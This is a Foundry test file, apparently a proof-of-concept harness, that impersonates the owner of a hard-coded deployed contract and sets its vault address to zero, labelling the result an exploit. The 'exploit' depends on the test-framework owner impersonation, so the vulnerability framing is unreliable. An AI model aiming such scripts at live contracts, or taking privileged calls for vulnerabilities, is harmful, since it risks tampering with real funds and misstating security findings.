// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISokenSapphireDao {
    function owner() external view returns (address);
    function setVault(address vault_) external returns (bool);
    function vault() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);
    address private owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        ISokenSapphireDao soken = ISokenSapphireDao(TARGET);
        owner = soken.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
        ISokenSapphireDao(TARGET).setVault(address(0));
        vm.stopPrank();
        assertEq(ISokenSapphireDao(TARGET).vault(), 0x0000000000000000000000000000000000000000, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

